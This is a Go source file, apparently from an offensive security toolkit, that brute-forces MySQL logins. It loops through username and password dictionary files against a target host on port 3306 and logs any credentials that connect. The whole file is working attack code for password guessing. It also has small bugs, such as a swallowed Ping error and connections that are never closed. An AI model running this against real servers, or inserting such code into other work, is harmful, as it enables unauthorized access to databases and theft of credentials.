package database

import (
	"database/sql"
	"fmt"
	"strings"

	_ "github.com/go-sql-driver/mysql"

	"github.com/seaung/gagako/pkg/utils"
)

func Connect2Mysql(host, username, passwd, port string) (bool, error) {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s:%s)/mysql?charset=utf8", username, passwd, host, port))
	if err != nil {
		return false, err
	}

	if db.Ping() != nil {
		return false, err
	}

	return true, nil
}

func BureforceMysql(categorite, target, ufile, pfile string) {
	for _, user := range utils.LoadUserDict(ufile) {
		for _, pass := range utils.LoadPasswordDict(pfile) {
			res, err := Connect2Mysql(target, user, pass, "3306")
			if res == true && err == nil {
				utils.New().Info(fmt.Sprintf("Connect mysql success !"))
				utils.New().Info(fmt.Sprintf("mysql host : %s : username : %s password : %s", target, user, pass))
				break
			}
		}
	}
}

func BureforceMysql2(categorite, target, filename string) {
	if utils.IsOpenPort(target, 3306) {
		for _, values := range utils.LoadDicts(filename) {
			line := strings.Split(values, ":")
			user := line[0]
			pass := line[1]
			res, err := Connect2Mysql(target, user, pass, "3306")
			if res == true && err == nil {
				utils.New().Info(fmt.Sprintf("mysql host : %s : username : %s password : %s", target, user, pass))
				break
			}
		}
	}
}
